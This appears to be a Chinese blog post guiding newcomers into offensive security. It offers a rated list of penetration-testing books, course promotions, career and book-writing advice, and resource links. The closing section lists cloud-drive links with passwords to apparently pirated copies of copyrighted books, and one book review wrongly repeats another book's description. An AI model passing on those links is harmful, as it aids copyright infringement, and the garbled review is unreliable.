02：The Hackers Playbook 2（难易度：★★★☆☆）
在这本书中，除了学习如何设置靶场实验室和 Kali Linux 之外，还将了解：OSINT、漏洞扫描、利用、Web应用程序安全性、社会工程学、密码解密等等。最重要的是内容详细，适用于新手。

03：The Hackers Playbook 3（难易度：★★★☆☆）
它将带领你完成一个渗透测试的所有阶段。可以帮助你配置渗透测试环境，然后带你完成渗透测试、信息收集、Web应用程序利用、网络受到破坏、社会工程技术、物理攻击等。

04：Improving your Penetration Testing Skills（难易度：★★★★☆）
这本书的学习路径专为希望了解漏洞利用并充分利用 Metasploit 框架的安全专业人员、Web 程序员和渗透测试人员而设计。需要对渗透和 Metasploit 测试有所了解，基本的系统管理技能和读取代码的能力也是必不可少的。

05：Tribe of Hackers Red Team（难易度：★★★★★）
凭借对系统漏洞的深入了解以及纠正安全漏洞的创新解决方案，红队黑客的需求量很大。这本书包括对有影响力的安全专家的启发性访谈，其中包含分享实战经验。

06：Advanced Penetration Testing: Hacking the World’s Most Secure Networks（难易度：★★★★★）
它涵盖了 ATP（高级渗透测试）的内容。也就是说，它将教给你远超 Kali Linux 工具的技术。你将学习这些工具的工作原理，以及如何从头到尾编写自己的工具。

仅适用于高级安全研究人员。

07：Hacking Ético. 3ª Edición （难易度：★★☆☆☆）
这本书采用了一种实用而有趣的方法，教你学习网络安全技术，并包含了带有流行操作系统（例如 Windows 和 Kali Linux）的实验室。

08：Seguridad informática Hacking Ético Conocer el ataque para una mejor defensa (4ta edición)（难易度：★★★☆☆）
这本书的作者介绍了攻击的方法和修复用于进入系统的漏洞的方法。“了解攻击是为了更好的防御”，以攻击的视角来学习网络安全知识。

09：El libro blanco del Hacker 2ª Edición Actualizada（难易度：★★★☆☆）
这本书包含了必要的攻击性安全技术，基于国际方法和标准，例如 PTES、OWASP、NIST等，来审核（通过渗透测试考试）能力。

10：Hacking con Metasploit: Advanced Pentesting（难易度：★★★☆☆）
你将学习高级的渗透测试技巧，payload 和模块的开发、如何避免限制性环境、修改 shellcode 等。这些主题将涵盖渗透测试人员在日常真实场景中面临的许多需求，并包含了安全人员当前使用的技术和工具讲解。

11：Hacking & cracking. Redes inalámbricas WiFi（难易度：★★★☆☆）
以正确的方式评估设备、无线网络和安全协议，以及执行道德规范的破解和黑客入侵。

这本书介绍了无线硬件的一些基本概念，并介绍了无线网络攻击的应用。

12：Hackear al Hacker. Aprende de los Expertos que Derrotan a los Hackers（难易度：★★★★☆）
这本书的作者在计算机安全领域工作了 27 年以上。

作为一名专业的渗透测试人员，他能够在一小时内成功访问目标服务器以对其进行黑客攻击。这本书的内容都是他的经验之谈，内容丰富，需要一定基础。



《资产探测与主机安全》：知识盒子 资产探测与主机安全：censys、fofa、NSE、Hydra等实用工具教学，体系化学习资产探测，高效辅助漏洞挖掘
《CTF实战特训课程》：知识盒子 CTF实战特训课程：典型套路、题目详解、代码审计、赛事讲解
《新手入门|穿越赛博》：知识盒子 新手入门|穿越赛博：常见安全工具安装与使用，视频教学，截图验证，适合网络安全入门
《主题进阶|前端黑客》：知识盒子 前端迷雾：常见web前端安全漏洞，简单易懂，在线靶场练习，视频演示，通过学习掌握基础前端安全思路
《暗夜契约|Python黑客》：知识盒子 python黑客: 内容涵盖流量分析，Flask模板注入等常见python安全基础与工具开发，需要有一定python基础，内容具有一定学习深度。
编辑于 2020-06-24
难度系数：⭐⭐⭐ 牛逼指数：⭐⭐⭐⭐ 实用指数：⭐⭐⭐⭐⭐

《白帽子讲Web安全》

2星

级别：初级

2012年出版，里面讲到常规漏洞XSS

《欺骗的艺术》
两星推荐
级别：初级
出版。本书作者是当时最厉害的黑客，书的内容主要是社会工程学，内容很简单，没有任何技术全是心理学。

《黑客攻防：实战加密与解密》
两星推荐
级别：初级
出版。本书作者是当时最厉害的黑客，书的内容主要是社会工程学，内容很简单，没有任何技术全是心理学。

《网络安全应急响应技术实战》
三星推荐
级别：初级
2020/8出版。奇安信认证网络安全工程师系列丛书，书的内容主要是防御。

《Web安全攻防渗透测试实战指南》
四星推荐
级别：初级
2018/07出版。国内人写的，注重基础，攻击与防御方法侃侃而来。
《Web Hacking 101》
四星推荐
级别：中级
2016年出版。里面有很多取自于hackone的例子，对于基础的内容比如漏洞介绍讲得很模糊，因而需要读者有一定知识储备。有实战看起来很棒的

《网站渗透测试实务入门》
两星推荐
级别：初级
2020 8月出版。主要覆盖了各类工具，对于想做工具党的网络玩家而言，这书做的总结还行。

《The Complete Guide to Shodan》
《渗透攻击红队百科全书》
三星推荐
级别：高级
这书优点是相对市面上的书更专业和全面，即便冷门的知识也会在书中出现，不适合初学者，里面排版很乱，很多地方就是贴了一长串代码，并不做过多的解释，因为作者假设我们等级很高，眨眼。
《The-Hacker-Playbook-3》
五星推荐
级别：中级
2020 8月出版


Books are a great way of deep diving into the theory, “The Web Application Hacker’s Handbook”, “Tangled Web: A guide to securing Modern Web Applications” and “The Browser Hacker’s Handbook” explore the sections outlined above, with the latter two books focusing specifically on browsers.

## 博客

[在安全界工作十年的大佬，他的文章同步更新在GitHub，獲得3k star；但github已经不在更新了，博客还在更新。最新的更新时间是2020/5月](https://micropoor.blogspot.com/)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210505223047942.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

## 其他资源

安卓逆向等： https://www.pd521.com/#


## 如何修成

这小节东西一部分是我提出来的，大多是对前辈们总结的总结，因为我还没有能力去指导你如何变成高手。理解这些东西将带你走出瓶颈，知道你应该为提升什么能力而努力，直到你对这些东西充分理解才不会花了好几年成为一个平淡无奇的黑客。具体你有时间可以多读我的这一小节推荐链接。

###  待补充：如何发现0day漏洞

观察网页的交互代码，接收用户输入的代码

#### 成为什么样的人

1. 任何问题都不应该被解决两次
2. 这个世界充满了迷人的问题等待解决。
3. 无聊和苦工是邪恶的。这种浪费伤害了每个人。
4. 努力工作。如果你崇尚能力，你就会喜欢在自己身上发展它——努力工作和奉献精神将成为一种激烈的游戏，而不是苦差事。这种态度对于成为一名黑客至关重要。
5. 黑客不信任他们部落长老的公然自负，因此明显地达到这种名声是危险的。与其为之奋斗，不如让自己摆正姿势，让它落在你的腿上，然后对自己的地位保持谦虚和亲切。


**跨越瓶颈区**
一旦你开始全职工作，你最初会学到很多东西，但过一段时间你的技术专长就会停滞不前，除非你齐心协力继续学习。拒绝让自己停留在这个障碍是成为网络安全研究人员的最重要的一步。
	
**实践想法**
没有想法太愚蠢。最容易落入的陷阱之一是通过假设一个好主意行不通而不去尝试而毁了它，因为“其他人会已经注意到它”或“这太愚蠢了”。
**打破舒适区**
如果一项技术因困难、繁琐或危险而著称，那么这就是一个急需进一步研究的主题。由于被迫探索远离我的舒适区的话题而反复经历了突破之后，我决定获得新发现的最快途径是积极寻找让你不舒服的话题。很有可能，其他黑客会回避这些话题，从而赋予他们重要的研究潜力
**证明黑客水平**

0day漏洞
许多站点能否被突破，对本身基础漏洞的熟练的配合利用也是一场考验



#### 让自己小有名气

公关对任何人来说都是必要的，所以总尝试在你的圈内出名吧。这些圈内名气都会对职业生涯大有帮助，而薪资也会随着你的名气呈正比增长。
努力奉献自己

写工具

##### 写书

**本人无写书的经验，以下是copy别人的文字，等我积累经验了，这段文字会修改**
比如一本书全价是70块，在京东等地打7折销售，那么版税是70块的8%，也就是说卖出一本作者能有5.6的收益，当然真实拿到手以后还再要扣税。

    同时也请注意合同的约定是支付稿酬的方式是印刷数还是实际销售数，我和出版社谈的，一般是印刷数量，这有什么差别呢？现在计算机类的图书一般是首印2500册，那么实际拿到手的钱数是 70*8%*2500，当然还要扣税。但如果是按实际销售数量算的话，如果首印才销了1800本的话，那么就得按这个数量算钱了。
    
    现在一本300页的书，定价一般在70左右，按版税8%和2500册算的话，税前收益是14000，税后估计是12000左右，对新手作者的话，300的书至少要写8个月，由此大家可以算下平均每个月的收益，算下来其实每月也就1500的收益，真不多。
    别人的情况我不敢说，但我出书以后，除了稿酬，还有哪些其它的收益呢？
    
    1 在当下和之前的公司面试时，告诉面试官我在相关方面出过书以后，面试官就直接会认为我很资深，帮我省了不少事情。
    
    2 我还在做线下的培训，我就直接拿我最近出的python书做教材了，省得我再备课了。
    
    3 和别人谈项目，能用我的书证明自己的技术实力，如果是第一次和别人打交道，那么这种证明能立杆见效。
    
    尤其是第一点，其实对一些小公司或者是一些外派开发岗而言，如果候选人在这个方面出过书，甚至都有可能免面试直接录取，本人之前面试过一个大公司的外派岗，就得到过这种待遇。 

 我在清华大学出版社、机械工业出版社、北京大学出版社和电子工业出版社出过书，出书流程也比较顺畅，和编辑打交道也比较愉快。我个人无意把国内出版社划分成三六九等，但计算机行业，比较知名的出版社有清华、机工、电子工业和人邮这四家，当然其它出版社在计算机方面也出版过精品书。
 如何同这些知名出版社的编辑直接打交道？

    1 直接到官网，一般官网上都直接有联系方式。
    
    2 你在博客园等地发表文章，会有人找你出书，其中除了图书公司的工作人员外，也有出版社编辑，一般出版社的编辑会直接说明身份，比如我是xx出版社的编辑xx。
    
    3 本人也和些出版社的编辑联系过，大家如果要，我可以给。
    
    那怎么去找图书公司的工作人员？一般不用主动找，你发表若干博文后，他们会主动找你。如果你细问，“您是出版社编辑还是图书公司的编辑”，他们会表明身份，如果你再细问，那么他们可能会站在图书公司的立场上解释出版社和图书公司的差异。
    
    从中大家可以看到，不管你最终是否写成书，但去找知名出版社的编辑，并不难。并且，你找到后，他们还会进一步和你交流选题。

   对一些作者而言，尤其是新手作者，出书不容易，往往是开始几个章节干劲十足，后面发现问题越积越多，外加工作一忙，就不了了之了，或者用1年以上的时间才能完成一本书。对此，我的感受是，一本300到400书的写作周期最长是8个月。为了能在这个时间段里完成一本书，我对应给出的建议是，新手作者可以写案例书，别先写介绍经验类的书
     这里就涉及到版权问题，先要说明，作者不能抱有任何幻想，如果出了版权问题，书没出版还好，如果已经出版了，作者不仅要赔钱，而且在业内就会有不好的名声，可谓身败名裂。但其实要避免版权问题一点也不难。

    1 不能抄袭网上现有的内容，哪怕一句也不行。对此，作者可以在理解人家语句含义的基础上改写。
    
    2 不能抄袭人家书上现有的目录，更不能抄袭人家书上的话，同样一句也不行，对应的解决方法同样是在理解的基础上改写。
    
    3 不能抄袭github上或者任何地方别人的代码，哪怕这个代码是开源的。对此，你可以在理解对方代码的基础上，先运行通，然后一定得自己新建一个项目，在你的项目里参考别人的代码实现你的功能，在这个过程中不能有大段的复制粘贴操作。也就是说，你的代码和别人的代码，在注释，变量命名，类名和方法名上不能有雷同的地方，当然你还可以额外加上你自己的功能。
    
    4 至于在写技术和案例介绍时，你就可以用你自己的话来说，这样也不会出现版权问题。 
    
    用了上述办法以后，作者就可以在参考现有资料的基础上，充分加上属于你的功能，写上你独到的理解，从而高效地出版属于你自己的书。

总结：在国内知名出版社出书，其实是个体力活
    可能当下，写公众号和录视频等的方式，挣钱收益要高于出书，不过话可以这样说，经营公众号和录制视频也是个长期的事情，在短时间里可能未必有收益，如果不是系统地发表内容的话，可能甚至不会有收益。所以出书可能是个非常好的前期准备工作，你靠出书系统积累了素材，靠出书整合了你的知识体系，那么在此基础上，靠公众号或者录视频挣钱可能就会事半功倍。
不过老实说，写书的意义不在于赚钱。仅仅从赚钱的角度来说，出网课可能更划算一些。但是如果想给自己的职业生涯留点东西，写书意义大于出网课。

### 更多阅读
在OWASP查看200多种漏洞

很知名，必读《如何成为一名黑客》我这个链接就是作者更新的最新版 http://www.catb.org/esr/faqs/hacker-howto.html
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210701185720116.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
https://portswigger.net/research/so-you-want-to-be-a-web-security-researcher




乌云漏洞库:https://wooyun.x10sec.org/
hackone报告：https://pan.baidu.com/s/1jPUSuoERSIDw2zCKZ0xTjA 提取码:2klt
黑客攻防技术宝典 Web实战篇 第2版 :

http://pan.baidu.com/s/1xhR1X
Web之困：现代Web应用安全指南(英文) :

http://pan.baidu.com/s/1vdkDo密码：3nok
Python灰帽子 黑客与逆向工程师的Python编程之道 :

	http://pan.baidu.com/s/1jGiIfDc		密码：i3os

Python黑帽子:黑客与渗透测试编程之道 :

	http://pan.baidu.com/s/1mhv22c4		密码：pa75

0day安全 软件漏洞分析技术(第2版) :

	http://pan.baidu.com/s/1sjLd2fr		密码：4hew

Reversing 逆向工程揭密 :

	http://pan.baidu.com/s/1jG2uQ9o		密码：5xe9

线上幽灵 世界头号黑客米特尼克自传 :

	http://pan.baidu.com/s/1hqwXFXM		密码：9a6t

社会工程 安全体系中的人性漏洞(英文) :

	http://pan.baidu.com/s/1zkSpL		密码：qj5t

黑客攻防技术宝典 Web实战篇 第2版 :

	http://pan.baidu.com/s/1xhR1X	

Rootkit:系统灰色地带的潜伏者(英文) :

	http://pan.baidu.com/s/1BY2rH	

Metasploit渗透测试魔鬼训练营 :

	http://pan.baidu.com/s/11iWPT 

## 待补充：寻求交流社区

Twitter/Reddit/StackOverflow

